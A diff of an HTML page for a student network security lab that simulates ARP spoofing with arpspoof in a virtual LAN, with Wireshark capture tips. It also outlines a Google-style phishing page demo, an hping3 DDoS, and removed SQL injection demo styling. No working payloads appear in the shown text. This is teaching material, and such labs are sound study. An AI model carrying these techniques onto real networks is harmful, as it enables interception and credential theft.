@@ -1,3 +1,4 @@
+```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -6,7 +7,6 @@
 <title>NetSec Lab — Interactive Simulation</title>
 <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=JetBrains+Mono:ital,wght@0,300;0,400;0,500;0,700;1,400&display=swap" rel="stylesheet">
 <style>
-/* (All your previous CSS remains exactly the same — only added a few new classes below) */
 *{margin:0;padding:0;box-sizing:border-box}
 :root{
   --bg:#080d16;--bg2:#0e1520;--bg3:#131d2e;--bg4:#1a2540;
@@ -22,187 +22,1273 @@
 html{scroll-behavior:smooth}
 body{background:var(--bg);color:var(--text);font-family:var(--font);overflow-x:hidden}
 
-/* ... [All your previous styles for nav, hero, timeline, sim-layout, terminal, phishing, ddos, etc. remain unchanged] ... */
+/* NAV */
+nav{position:sticky;top:0;z-index:200;background:rgba(8,13,22,0.97);backdrop-filter:blur(16px);border-bottom:1px solid var(--border)}
+.nav-inner{max-width:1200px;margin:0 auto;padding:0 24px;display:flex;align-items:center;height:52px;gap:8px}
+.nav-logo{font-family:var(--mono);font-size:12px;font-weight:700;color:var(--cyan);letter-spacing:2px;margin-right:auto;display:flex;align-items:center;gap:8px}
+.nav-logo::before{content:'';width:7px;height:7px;background:var(--green);border-radius:50%;animation:blink-anim 2s infinite}
+.npill{padding:4px 12px;border-radius:20px;font-size:11px;font-weight:700;font-family:var(--mono);letter-spacing:.5px;border:1px solid;cursor:pointer;transition:all .2s;text-decoration:none}
+.np-a{color:var(--blue);border-color:rgba(59,130,246,.4);background:rgba(59,130,246,.08)}
+.np-b{color:var(--red);border-color:rgba(239,68,68,.4);background:rgba(239,68,68,.08)}
+.np-c{color:var(--green);border-color:rgba(16,185,129,.4);background:rgba(16,185,129,.08)}
+.np-d{color:var(--purple);border-color:rgba(139,92,246,.4);background:rgba(139,92,246,.08)}
 
-/* NEW: SQL Injection Demo Styles */
-.sql-demo{background:var(--bg3);border:1px solid var(--border2);border-radius:10px;overflow:hidden}
-.sql-bar{background:var(--bg4);padding:8px 12px;font-family:var(--mono);font-size:11px;display:flex;align-items:center;gap:8px;border-bottom:1px solid var(--border)}
-.sql-body{padding:20px;background:#fff;color:#111}
-.sql-input{width:100%;padding:10px;border:1px solid #ccc;border-radius:4px;margin-bottom:12px;font-family:var(--mono)}
-.sql-btn{width:100%;padding:11px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-weight:600;cursor:pointer}
-.sql-query-box{margin-top:15px;padding:12px;background:var(--tbg);border:1px solid var(--border);font-family:var(--mono);font-size:12px;color:var(--tgreen);border-radius:6px;min-height:60px}
-.sql-result{margin-top:12px;padding:12px;border-radius:6px;font-family:var(--mono);font-size:13px}
-.sql-success{background:rgba(16,185,129,.15);border:1px solid var(--green);color:var(--green)}
-.sql-fail{background:rgba(239,68,68,.15);border:1px solid var(--red);color:var(--red)}
-.sql-payloads{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}
-.sql-payload{display:inline-block;padding:4px 10px;background:var(--bg3);border:1px solid var(--border2);border-radius:4px;font-size:11px;cursor:pointer}
+/* HERO */
+.hero{max-width:1200px;margin:0 auto;padding:70px 24px 52px}
+.eyebrow{font-family:var(--mono);font-size:11px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin-bottom:22px;display:flex;align-items:center;gap:10px}
+.eyebrow span{width:28px;height:1px;background:var(--dim)}
+h1{font-size:clamp(38px,6vw,68px);font-weight:800;line-height:1.0;letter-spacing:-2px;color:#fff;margin-bottom:18px}
+.acc1{color:var(--cyan)}.acc2{color:var(--green)}
+.hero-sub{color:var(--muted);font-size:15px;max-width:560px;line-height:1.7;margin-bottom:32px}
+.chips{display:flex;flex-wrap:wrap;gap:10px}
+.chip{display:flex;align-items:center;gap:7px;padding:7px 14px;background:var(--bg3);border:1px solid var(--border2);border-radius:8px;font-size:12px;font-weight:600;font-family:var(--mono)}
+.cdot{width:6px;height:6px;border-radius:50%}
+
+/* TIMELINE */
+.timeline{display:grid;grid-template-columns:repeat(4,1fr);border:1px solid var(--border2);border-radius:10px;overflow:hidden;max-width:1200px;margin:0 auto 0;padding:0 24px}
+.timeline{padding:0;margin:0 24px}
+.tw{padding:18px;border-right:1px solid var(--border)}.tw:last-child{border-right:none}
+.twl{font-family:var(--mono);font-size:10px;color:var(--cyan);letter-spacing:2px;font-weight:700;margin-bottom:5px}
+.twt{font-size:13px;font-weight:700;color:#fff;margin-bottom:8px}
+.twi{list-style:none;display:flex;flex-direction:column;gap:4px}
+.twi li{font-size:11px;color:var(--muted);display:flex;gap:5px}
+.twi li::before{content:'›';color:var(--blue);font-family:var(--mono)}
+
+/* SECTION */
+.lab-sec{border-top:1px solid var(--border);padding:60px 0}
+.sw{max-width:1200px;margin:0 auto;padding:0 24px}
+.sec-eyebrow{display:flex;align-items:center;gap:12px;margin-bottom:18px}
+.sbadge{font-family:var(--mono);font-size:10px;font-weight:700;letter-spacing:2px;padding:4px 12px;border-radius:4px;text-transform:uppercase}
+.stag{font-family:var(--mono);font-size:11px;color:var(--muted)}
+.stitle{font-size:clamp(20px,3vw,32px);font-weight:800;color:#fff;margin-bottom:8px;letter-spacing:-1px}
+.sdesc{color:var(--muted);font-size:14px;max-width:700px;line-height:1.7;margin-bottom:32px}
+
+/* SIM LAYOUT */
+.sim-layout{display:grid;grid-template-columns:1fr 320px;gap:20px;align-items:start;margin-bottom:44px}
+.side{display:flex;flex-direction:column;gap:12px}
+
+/* STEP LABEL */
+.step-label{font-family:var(--mono);font-size:10px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-bottom:10px;display:flex;align-items:center;gap:8px}
+.step-num-badge{background:var(--bg3);border:1px solid var(--border2);padding:2px 8px;border-radius:4px;font-size:10px;font-weight:700}
+
+/* TOOL BAR */
+.tool-bar{display:flex;align-items:center;gap:10px;padding:9px 16px;border-radius:10px 10px 0 0;border:1px solid;border-bottom:none}
+.tdots{display:flex;gap:5px}
+.tdots span{width:10px;height:10px;border-radius:50%}
+.tname{font-family:var(--mono);font-size:12px;font-weight:500;margin-left:4px}
+.tver{font-family:var(--mono);font-size:11px;color:var(--muted);margin-left:auto}
+
+/* TERMINAL */
+.term-wrap{border-radius:0 0 0 0;overflow:hidden;border:1px solid;border-top:none}
+.terminal{background:var(--tbg);min-height:260px;max-height:380px;overflow-y:auto;padding:14px 18px;font-family:var(--mono);font-size:12.5px;line-height:1.95;scroll-behavior:smooth}
+.terminal::-webkit-scrollbar{width:3px}
+.terminal::-webkit-scrollbar-thumb{background:var(--dim);border-radius:2px}
+
+/* TERMINAL LINE TYPES */
+.tl{display:block;animation:lineIn .12s ease forwards}
+.tl-cmd .tp{color:var(--tdim)}
+.tl-cmd .tc{color:var(--tgreen)}
+.tl-out .tc{color:#3a7050;padding-left:0}
+.tl-warn .tc{color:var(--tamber)}
+.tl-err .tc{color:var(--tred)}
+.tl-info .tc{color:var(--tcyan)}
+.tl-success .tc{color:#00ee77}
+.tl-comment .tc{color:var(--tmuted)}
+.tl-header .tc{color:var(--tcyan);font-weight:700}
+.tl-blank .tc{color:transparent}
+.tcursor{display:inline-block;width:7px;height:13px;background:var(--tgreen);animation:blink-anim 1s infinite;vertical-align:middle;margin-left:1px}
+
+/* CONTROLS */
+.ctrl{display:flex;align-items:center;gap:8px;padding:10px 14px;background:var(--bg3);border:1px solid;border-top:1px solid var(--border);border-radius:0 0 10px 10px}
+.btn-next{display:flex;align-items:center;gap:7px;padding:7px 18px;border-radius:6px;font-family:var(--mono);font-size:12px;font-weight:700;letter-spacing:.5px;cursor:pointer;border:1px solid;transition:all .18s;white-space:nowrap}
+.btn-next:disabled{opacity:.3;cursor:not-allowed}
+.btn-reset{padding:6px 12px;border-radius:6px;font-family:var(--mono);font-size:11px;cursor:pointer;border:1px solid var(--border2);color:var(--muted);background:transparent;transition:all .18s}
+.btn-reset:hover{border-color:var(--blue);color:var(--text)}
+.prog-wrap{flex:1;display:flex;align-items:center;gap:8px;min-width:0}
+.prog-track{flex:1;height:3px;background:var(--border);border-radius:2px;overflow:hidden}
+.prog-fill{height:100%;border-radius:2px;transition:width .3s ease}
+.prog-lbl{font-family:var(--mono);font-size:10px;color:var(--muted);white-space:nowrap}
+.sbadge2{font-family:var(--mono);font-size:10px;font-weight:700;padding:3px 8px;border-radius:4px;letter-spacing:.5px;white-space:nowrap}
+
+/* WIRESHARK TABLE */
+.ws-box{overflow:hidden;border:1px solid;border-top:none;border-radius:0 0 0 0}
+.wstable{width:100%;border-collapse:collapse;font-family:var(--mono);font-size:11px}
+.wstable th{background:#040c18;color:#2a4a6a;padding:7px 9px;text-align:left;font-weight:600;border-bottom:1px solid var(--border)}
+.wstable td{padding:6px 9px;border-bottom:1px solid rgba(20,35,55,.5);color:#3a6a58;transition:opacity .3s}
+.wstable tr{opacity:0;transition:opacity .25s}
+.wstable tr.vis{opacity:1}
+.wstable tr.warn-r td{color:#996600;background:rgba(255,170,0,.04)}
+.wstable tr.err-r td{color:#993333;background:rgba(255,68,68,.04)}
+.proto{font-weight:700}
+.p-arp{color:#f59e0b}.p-tcp{color:#3b82f6}.p-rtp{color:#8b5cf6}.p-sip{color:#10b981}.p-udp{color:#06b6d4}.p-http{color:#f97316}.p-ws{color:#ec4899}
+
+/* INFO CARDS */
+.icard{background:var(--bg3);border:1px solid var(--border2);border-radius:10px;overflow:hidden}
+.icard-head{padding:9px 14px;font-family:var(--mono);font-size:10px;font-weight:700;letter-spacing:1px;border-bottom:1px solid var(--border)}
+.icard-body{padding:12px 14px}
+.irow{display:flex;justify-content:space-between;align-items:flex-start;padding:5px 0;border-bottom:1px solid rgba(30,45,69,.35);font-size:12px;gap:6px}
+.irow:last-child{border-bottom:none}
+.ik{color:var(--muted);font-family:var(--mono);font-size:11px;flex-shrink:0}
+.iv{color:var(--text);font-weight:600;font-family:var(--mono);font-size:11px;text-align:right}
+
+/* NETWORK VIS */
+.net-vis{padding:12px 14px;font-family:var(--mono);font-size:11px}
+.nnode{display:flex;align-items:center;gap:8px;padding:5px 8px;border-radius:6px;margin:3px 0}
+.nnode .icon{font-size:14px;width:18px;text-align:center;flex-shrink:0}
+.narrow{color:var(--dim);padding-left:26px;font-size:10px;line-height:1.8}
+
+/* PHISHING */
+.phish-preview{background:var(--bg3);border:1px solid var(--border2);border-radius:10px;overflow:hidden}
+.phish-bar{background:var(--bg4);padding:7px 10px;display:flex;align-items:center;gap:7px;font-family:var(--mono);font-size:11px;border-bottom:1px solid var(--border)}
+.phish-dots span{width:8px;height:8px;border-radius:50%;display:inline-block;margin-right:3px}
+.phish-url{flex:1;background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);border-radius:3px;padding:2px 8px;color:var(--red);font-size:10px}
+.phish-body{padding:18px 16px;background:#fff;text-align:center}
+.glogo{font-size:26px;font-weight:800;color:#4285f4;letter-spacing:-1px;margin-bottom:2px}
+.gsub{font-size:10px;color:#5f6368;margin-bottom:14px}
+.ginput{width:100%;padding:9px 10px;border:1.5px solid #ddd;border-radius:4px;font-size:13px;margin-bottom:8px;color:#333;display:block}
+.gbtn{width:100%;padding:9px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:13px;font-weight:600;cursor:pointer;margin-top:2px}
+.creds-out{display:none;background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.4);border-radius:5px;padding:8px 10px;font-family:var(--mono);font-size:10px;color:var(--red);margin-top:8px;text-align:left}
+
+/* VOIP FLOW */
+.vf-step{display:flex;align-items:center;gap:8px;padding:7px 10px;border-radius:6px;margin:4px 0;opacity:.22;transition:opacity .4s,background .3s}
+.vf-step.on{opacity:1;background:rgba(139,92,246,.1)}
+.vf-num{width:22px;height:22px;border-radius:50%;background:rgba(139,92,246,.2);border:1px solid rgba(139,92,246,.35);color:var(--purple);font-size:10px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-family:var(--mono)}
+.vf-title{font-weight:700;font-size:11px;color:#fff}
+.vf-sub{font-size:10px;color:var(--muted)}
+
+/* DDOS BARS */
+.ddos-bar-row{margin-bottom:8px}
+.ddos-lbl{display:flex;justify-content:space-between;font-family:var(--mono);font-size:10px;margin-bottom:3px}
+.ddos-track{height:6px;background:var(--border);border-radius:3px;overflow:hidden}
+.ddos-fill{height:100%;border-radius:3px;transition:width .8s ease,background .5s}
+
+/* GRAPH BARS */
+.graph-wrap{padding:14px}
+.graph-bars{display:flex;gap:8px;align-items:flex-end;height:110px;margin-bottom:6px}
+.bar-col{flex:1;display:flex;flex-direction:column;align-items:center;gap:3px}
+.gbar{width:100%;border-radius:3px 3px 0 0;transition:height .8s ease;min-height:2px}
+.gbarlbl{font-family:var(--mono);font-size:9px;color:var(--muted);text-align:center;line-height:1.3}
+.gbarval{font-family:var(--mono);font-size:9px;color:var(--text)}
+
+/* COLOR THEMES PER SECTION */
+/* A = blue */
+.ca .tool-bar{border-color:rgba(59,130,246,.35);background:rgba(59,130,246,.05)}
+.ca .term-wrap{border-color:rgba(59,130,246,.22)}
+.ca .ctrl{border-color:rgba(59,130,246,.22)}
+.ca .btn-next{background:rgba(59,130,246,.1);border-color:rgba(59,130,246,.45);color:var(--blue)}
+.ca .btn-next:hover:not(:disabled){background:rgba(59,130,246,.2)}
+.ca .prog-fill{background:var(--blue)}
+.ca .ws-box{border-color:rgba(59,130,246,.22)}
+.ca .ws-box-ctrl{border-color:rgba(59,130,246,.22)}
+/* B1 = red */
+.cb1 .tool-bar{border-color:rgba(239,68,68,.35);background:rgba(239,68,68,.04)}
+.cb1 .term-wrap{border-color:rgba(239,68,68,.22)}
+.cb1 .ctrl{border-color:rgba(239,68,68,.22)}
+.cb1 .btn-next{background:rgba(239,68,68,.1);border-color:rgba(239,68,68,.45);color:var(--red)}
+.cb1 .btn-next:hover:not(:disabled){background:rgba(239,68,68,.2)}
+.cb1 .prog-fill{background:var(--red)}
+/* B2 = amber */
+.cb2 .tool-bar{border-color:rgba(245,158,11,.35);background:rgba(245,158,11,.04)}
+.cb2 .term-wrap{border-color:rgba(245,158,11,.22)}
+.cb2 .ctrl{border-color:rgba(245,158,11,.22)}
+.cb2 .btn-next{background:rgba(245,158,11,.1);border-color:rgba(245,158,11,.45);color:var(--amber)}
+.cb2 .btn-next:hover:not(:disabled){background:rgba(245,158,11,.2)}
+.cb2 .prog-fill{background:var(--amber)}
+/* B3 = pink */
+.cb3 .tool-bar{border-color:rgba(236,72,153,.35);background:rgba(236,72,153,.04)}
+.cb3 .term-wrap{border-color:rgba(236,72,153,.22)}
+.cb3 .ctrl{border-color:rgba(236,72,153,.22)}
+.cb3 .btn-next{background:rgba(236,72,153,.1);border-color:rgba(236,72,153,.45);color:var(--pink)}
+.cb3 .btn-next:hover:not(:disabled){background:rgba(236,72,153,.2)}
+.cb3 .prog-fill{background:var(--pink)}
+/* C = green */
+.cc .tool-bar{border-color:rgba(16,185,129,.35);background:rgba(16,185,129,.04)}
+.cc .term-wrap{border-color:rgba(16,185,129,.22)}
+.cc .ctrl{border-color:rgba(16,185,129,.22)}
+.cc .btn-next{background:rgba(16,185,129,.1);border-color:rgba(16,185,129,.45);color:var(--green)}
+.cc .btn-next:hover:not(:disabled){background:rgba(16,185,129,.2)}
+.cc .prog-fill{background:var(--green)}
+.cc .ws-box{border-color:rgba(16,185,129,.22)}
+.cc .ws-box-ctrl{border-color:rgba(16,185,129,.22)}
+/* D = purple */
+.cd .tool-bar{border-color:rgba(139,92,246,.35);background:rgba(139,92,246,.04)}
+.cd .term-wrap{border-color:rgba(139,92,246,.22)}
+.cd .ctrl{border-color:rgba(139,92,246,.22)}
+.cd .btn-next{background:rgba(139,92,246,.1);border-color:rgba(139,92,246,.45);color:var(--purple)}
+.cd .btn-next:hover:not(:disabled){background:rgba(139,92,246,.2)}
+.cd .prog-fill{background:var(--purple)}
+.cd .ws-box{border-color:rgba(139,92,246,.22)}
+.cd .ws-box-ctrl{border-color:rgba(139,92,246,.22)}
+
+/* ANIMS */
+@keyframes blink-anim{0%,50%{opacity:1}51%,100%{opacity:0}}
+@keyframes lineIn{from{opacity:0;transform:translateY(3px)}to{opacity:1;transform:translateY(0)}}
+
+/* FOOTER */
+footer{border-top:1px solid var(--border);padding:24px;text-align:center;font-family:var(--mono);font-size:11px;color:var(--muted)}
+
+@media(max-width:880px){
+  .sim-layout{grid-template-columns:1fr}
+  .side{display:none}
+  .timeline{grid-template-columns:1fr 1fr}
+  .tw:nth-child(2){border-right:none}
+}
 </style>
 </head>
 <body>
 
-<!-- NAV, HERO, TIMELINE, PART A, PART C, PART D remain exactly the same as before -->
+<!-- NAV -->
+<nav>
+  <div class="nav-inner">
+    <div class="nav-logo">// NETSEC LAB</div>
+    <a href="#parta" class="npill np-a">Part A</a>
+    <a href="#partb" class="npill np-b">Part B</a>
+    <a href="#partc" class="npill np-c">Part C</a>
+    <a href="#partd" class="npill np-d">Part D</a>
+  </div>
+</nav>
 
-<!-- PART B with new SQL Injection demo added -->
+<!-- HERO -->
+<div class="hero">
+  <div class="eyebrow"><span></span>Student Engineering Project — Interactive Lab<span></span></div>
+  <h1>Network <span class="acc1">Security</span><br>& <span class="acc2">VoIP</span> Lab</h1>
+  <p class="hero-sub">Step-by-step simulated environments. Press <strong style="color:var(--text)">Next Step</strong> to print each line of the simulation — just like a real terminal session.</p>
+  <div class="chips">
+    <div class="chip"><span class="cdot" style="background:var(--blue)"></span>Cisco Packet Tracer</div>
+    <div class="chip"><span class="cdot" style="background:var(--cyan)"></span>Wireshark</div>
+    <div class="chip"><span class="cdot" style="background:var(--red)"></span>Kali Linux</div>
+    <div class="chip"><span class="cdot" style="background:var(--amber)"></span>VirtualBox</div>
+    <div class="chip"><span class="cdot" style="background:var(--purple)"></span>Asterisk VoIP</div>
+  </div>
+</div>
+
+<!-- TIMELINE -->
+<div style="max-width:1200px;margin:0 auto 0;padding:0 24px 0">
+  <div class="timeline" style="margin:0">
+    <div class="tw" style="background:rgba(59,130,246,.03)">
+      <div class="twl">WEEK 01</div><div class="twt">LAN Setup</div>
+      <ul class="twi"><li>Install VirtualBox</li><li>Create 3–5 VMs</li><li>Static IP config</li><li>Kali Linux setup</li><li>Test connectivity</li></ul>
+    </div>
+    <div class="tw">
+      <div class="twl">WEEK 02</div><div class="twt">Attack Simulation</div>
+      <ul class="twi"><li>Run arpspoof</li><li>Capture packets</li><li>Document evidence</li><li>Screenshots</li><li>Write analysis</li></ul>
+    </div>
+    <div class="tw">
+      <div class="twl">WEEK 03</div><div class="twt">Threats + Analysis</div>
+      <ul class="twi"><li>Phishing page demo</li><li>hping3 DDoS</li><li>Wireshark captures</li><li>Data usage graph</li><li>Privacy writeup</li></ul>
+    </div>
+    <div class="tw" style="background:rgba(139,92,246,.03)">
+      <div class="twl">WEEK 04</div><div class="twt">VoIP + Report</div>
+      <ul class="twi"><li>Setup Asterisk</li><li>Configure Zoiper</li><li>Capture SIP/RTP</li><li>Write full report</li><li>Final submission</li></ul>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════ -->
+<!-- PART A                              -->
+<!-- ═══════════════════════════════════ -->
+<div id="parta" class="lab-sec">
+<div class="sw">
+  <div class="sec-eyebrow">
+    <span class="sbadge" style="background:rgba(59,130,246,.15);color:var(--blue);border:1px solid rgba(59,130,246,.3)">PART A</span>
+    <span class="stag">Cisco Packet Tracer · VirtualBox · Kali Linux · Wireshark</span>
+  </div>
+  <div class="stitle">LAN Security Breach — <span style="color:var(--blue)">ARP Spoofing</span></div>
+  <p class="sdesc">Build a 4-VM virtual LAN, launch a real ARP spoofing attack from Kali Linux using <code style="font-family:var(--mono);color:var(--cyan);font-size:12px">arpspoof</code>, intercept client–server traffic, and capture the duplicate ARP packets in Wireshark. Each step runs line-by-line.</p>
+
+  <!-- A-STEP 1: Cisco Packet Tracer -->
+  <div class="sim-layout ca">
+    <div>
+      <div class="step-label"><span class="step-num-badge" style="color:var(--blue)">A1</span>Cisco Packet Tracer — LAN Topology</div>
+      <div class="tool-bar"><div class="tdots"><span style="background:#ef4444"></span><span style="background:#f59e0b"></span><span style="background:#10b981"></span></div><span class="tname" style="color:var(--blue)">Cisco Packet Tracer 8.2</span><span class="tver">New Project: LAN_Security_Lab.pkt</span></div>
+      <div class="term-wrap"><div class="terminal" id="T-a1"><span class="tl tl-cmd"><span class="tp">PT&gt; </span><span class="tcursor"></span></span></div></div>
+      <div class="ctrl ca">
+        <button class="btn-next" id="btn-a1">▶ Next Step</button>
+        <button class="btn-reset" onclick="R('a1')">↺ Reset</button>
+        <div class="prog-wrap"><div class="prog-track"><div class="prog-fill" id="pf-a1" style="width:0%"></div></div><span class="prog-lbl" id="pl-a1">0 / 0</span></div>
+        <span class="sbadge2" id="sb-a1" style="background:rgba(59,130,246,.1);color:var(--blue)">READY</span>
+      </div>
+    </div>
+    <div class="side">
+      <div class="icard">
+        <div class="icard-head" style="color:var(--blue)">NETWORK TOPOLOGY</div>
+        <div class="net-vis">
+          <div class="nnode" style="background:rgba(16,185,129,.08);border:1px solid rgba(16,185,129,.2)"><span class="icon">🖥️</span><div><div style="color:var(--green);font-weight:700;font-size:11px">Server VM</div><div style="color:var(--muted);font-size:10px;font-family:var(--mono)">192.168.1.1 — Ubuntu</div></div></div>
+          <div class="narrow">↕ Switch SW1 (192.168.1.0/24)</div>
+          <div class="nnode" style="background:rgba(59,130,246,.08);border:1px solid rgba(59,130,246,.2)"><span class="icon">💻</span><div><div style="color:var(--blue);font-weight:700;font-size:11px">Client A</div><div style="color:var(--muted);font-size:10px;font-family:var(--mono)">192.168.1.10 — Ubuntu</div></div></div>
+          <div class="nnode" style="background:rgba(59,130,246,.06);border:1px solid rgba(59,130,246,.15)"><span class="icon">💻</span><div><div style="color:var(--blue);font-weight:700;font-size:11px">Client B</div><div style="color:var(--muted);font-size:10px;font-family:var(--mono)">192.168.1.11 — Ubuntu</div></div></div>
+          <div class="nnode" style="background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.25)"><span class="icon">👾</span><div><div style="color:var(--red);font-weight:700;font-size:11px">Attacker</div><div style="color:var(--muted);font-size:10px;font-family:var(--mono)">192.168.1.99 — Kali</div></div></div>
+        </div>
+      </div>
+      <div class="icard">
+        <div class="icard-head" style="color:var(--muted)">VM SPECS</div>
+        <div class="icard-body">
+          <div class="irow"><span class="ik">RAM each</span><span class="iv">1–2 GB</span></div>
+          <div class="irow"><span class="ik">Network mode</span><span class="iv">Internal (intnet)</span></div>
+          <div class="irow"><span class="ik">Subnet</span><span class="iv">192.168.1.0/24</span></div>
+          <div class="irow"><span class="ik">Attacker OS</span><span class="iv">Kali Linux</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- A-STEP 2: VirtualBox Config -->
+  <div class="sim-layout ca">
+    <div>
+      <div class="step-label"><span class="step-num-badge" style="color:var(--blue)">A2</span>VirtualBox — Static IP Configuration</div>
+      <div class="tool-bar"><div class="tdots"><span style="background:#ef4444"></span><span style="background:#f59e0b"></span><span style="background:#10b981"></span></div><span class="tname" style="color:var(--blue)">VirtualBox 7.0 — ubuntu@server</span><span class="tver">intnet adapter</span></div>
+      <div class="term-wrap"><div class="terminal" id="T-a2"><span class="tl tl-cmd"><span class="tp">ubuntu@server:~$ </span><span class="tcursor"></span></span></div></div>
+      <div class="ctrl ca">
+        <button class="btn-next" id="btn-a2">▶ Next Step</button>
+        <button class="btn-reset" onclick="R('a2')">↺ Reset</button>
+        <div class="prog-wrap"><div class="prog-track"><div class="prog-fill" id="pf-a2" style="width:0%"></div></div><span class="prog-lbl" id="pl-a2">0 / 0</span></div>
+        <span class="sbadge2" id="sb-a2" style="background:rgba(59,130,246,.1);color:var(--blue)">READY</span>
+      </div>
+    </div>
+    <div class="side">
+      <div class="icard">
+        <div class="icard-head" style="color:var(--green)">ARP CACHE — BEFORE ATTACK</div>
+        <div class="icard-body">
+          <div class="irow"><span class="ik">192.168.1.1</span><span class="iv" style="color:var(--green)">aa:bb:cc:01 ✓</span></div>
+          <div class="irow"><span class="ik">192.168.1.10</span><span class="iv" style="color:var(--green)">aa:bb:cc:10 ✓</span></div>
+          <div class="irow"><span class="ik">192.168.1.11</span><span class="iv" style="color:var(--green)">aa:bb:cc:11 ✓</span></div>
+          <div class="irow"><span class="ik">Status</span><span class="iv" style="color:var(--green)">LEGITIMATE</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- A-STEP 3: Kali ARP Spoof -->
+  <div class="sim-layout ca">
+    <div>
+      <div class="step-label"><span class="step-num-badge" style="color:var(--red)">A3</span>Kali Linux — ARP Spoofing Attack (arpspoof)</div>
+      <div class="tool-bar" style="border-color:rgba(239,68,68,.35);background:rgba(239,68,68,.04)"><div class="tdots"><span style="background:#ef4444"></span><span style="background:#f59e0b"></span><span style="background:#10b981"></span></div><span class="tname" style="color:var(--red)">Kali Linux — root terminal</span><span class="tver">arpspoof / dsniff suite</span></div>
+      <div class="term-wrap" style="border-color:rgba(239,68,68,.22)"><div class="terminal" id="T-a3"><span class="tl tl-cmd"><span class="tp">┌──(root㉿kali)-[~]<br>└─# </span><span class="tcursor"></span></span></div></div>
+      <div class="ctrl ca" style="border-color:rgba(239,68,68,.22)">
+        <button class="btn-next" id="btn-a3" style="background:rgba(239,68,68,.1);border-color:rgba(239,68,68,.45);color:var(--red)">▶ Next Step</button>
+        <button class="btn-reset" onclick="R('a3')">↺ Reset</button>
+        <div class="prog-wrap"><div class="prog-track"><div class="prog-fill" id="pf-a3" style="width:0%;background:var(--red)"></div></div><span class="prog-lbl" id="pl-a3">0 / 0</span></div>
+        <span class="sbadge2" id="sb-a3" style="background:rgba(239,68,68,.1);color:var(--red)">READY</span>
+      </div>
+    </div>
+    <div class="side">
+      <div class="icard">
+        <div class="icard-head" style="color:var(--red)">ARP CACHE — AFTER ATTACK</div>
+        <div class="icard-body">
+          <div class="irow"><span class="ik">192.168.1.1</span><span class="iv" style="color:var(--red)">aa:bb:cc:99 ✗ FAKE</span></div>
+          <div class="irow"><span class="ik">192.168.1.10</span><span class="iv" style="color:var(--red)">aa:bb:cc:99 ✗ FAKE</span></div>
+          <div class="irow"><span class="ik">Attacker MAC</span><span class="iv" style="color:var(--amber)">aa:bb:cc:99</span></div>
+        </div>
+      </div>
+      <div class="icard">
+        <div class="icard-head" style="color:var(--muted)">VULNERABILITY</div>
+        <div class="icard-body" style="font-size:12px">
+          <div style="color:var(--red);font-weight:700;margin-bottom:5px">Cause: No ARP Auth</div>
+          <div style="color:var(--muted);line-height:1.6">Any host can broadcast fake ARP replies. Victims update their cache without verifying the sender.</div>
+          <div style="margin-top:8px;color:var(--amber);font-weight:700">Impact:</div>
+          <div style="color:var(--muted);line-height:1.6">Data theft, credential capture, full MiTM position</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- A-STEP 4: Wireshark ARP -->
+  <div class="sim-layout ca">
+    <div>
+      <div class="step-label"><span class="step-num-badge" style="color:var(--cyan)">A4</span>Wireshark — Packet Capture (Filter: arp)</div>
+      <div class="tool-bar"><div class="tdots"><span style="background:#ef4444"></span><span style="background:#f59e0b"></span><span style="background:#10b981"></span></div><span class="tname" style="color:var(--cyan)">Wireshark 4.2 — eth0</span><span class="tver">Capture filter: arp</span></div>
+      <div class="ws-box ca"><table class="wstable"><thead><tr><th>No.</th><th>Time</th><th>Source IP</th><th>Destination</th><th>Protocol</th><th>Len</th><th>Info</th></tr></thead><tbody id="WS-a4"></tbody></table></div>
+      <div class="ctrl ca ws-box-ctrl ca">
+        <button class="btn-next" id="btn-a4">▶ Next Packet</button>
+        <button class="btn-reset" onclick="R('a4')">↺ Reset</button>
+        <div class="prog-wrap"><div class="prog-track"><div class="prog-fill" id="pf-a4" style="width:0%"></div></div><span class="prog-lbl" id="pl-a4">0 / 0</span></div>
+        <span class="sbadge2" id="sb-a4" style="background:rgba(59,130,246,.1);color:var(--blue)">READY</span>
+      </div>
+    </div>
+    <div class="side">
+      <div class="icard">
+        <div class="icard-head" style="color:var(--amber)">WHAT TO SCREENSHOT</div>
+        <div class="icard-body" style="font-size:12px;display:flex;flex-direction:column;gap:7px">
+          <div style="padding:7px;background:rgba(245,158,11,.07);border-radius:5px;border:1px solid rgba(245,158,11,.2)"><div style="color:var(--amber);font-weight:700">Duplicate ARP Replies</div><div style="color:var(--muted);font-size:11px;margin-top:2px">Same IP, two different MAC addresses</div></div>
+          <div style="padding:7px;background:rgba(239,68,68,.07);border-radius:5px;border:1px solid rgba(239,68,68,.2)"><div style="color:var(--red);font-weight:700">Gratuitous ARP</div><div style="color:var(--muted);font-size:11px;margin-top:2px">Unsolicited reply — classic spoof signature</div></div>
+          <div style="padding:7px;background:rgba(239,68,68,.07);border-radius:5px;border:1px solid rgba(239,68,68,.2)"><div style="color:var(--red);font-weight:700">Intercepted HTTP</div><div style="color:var(--muted);font-size:11px;margin-top:2px">Plaintext credentials visible in packet</div></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ═══════════════════════════════════ -->
+<!-- PART B                              -->
+<!-- ═══════════════════════════════════ -->
 <div id="partb" class="lab-sec">
 <div class="sw">
   <div class="sec-eyebrow">
     <span class="sbadge" style="background:rgba(239,68,68,.15);color:var(--red);border:1px solid rgba(239,68,68,.3)">PART B</span>
-    <span class="stag">Kali Linux · Python · HTML Demo · Web Vulnerabilities</span>
+    <span class="stag">Kali Linux · Python · HTML Demo</span>
   </div>
   <div class="stitle">Threat Identification — <span style="color:var(--red)">Live Demos</span></div>
-  <p class="sdesc">Malware propagation, Phishing, **SQL Injection**, and DDoS server overload. Each runs interactively. Try the payloads yourself!</p>
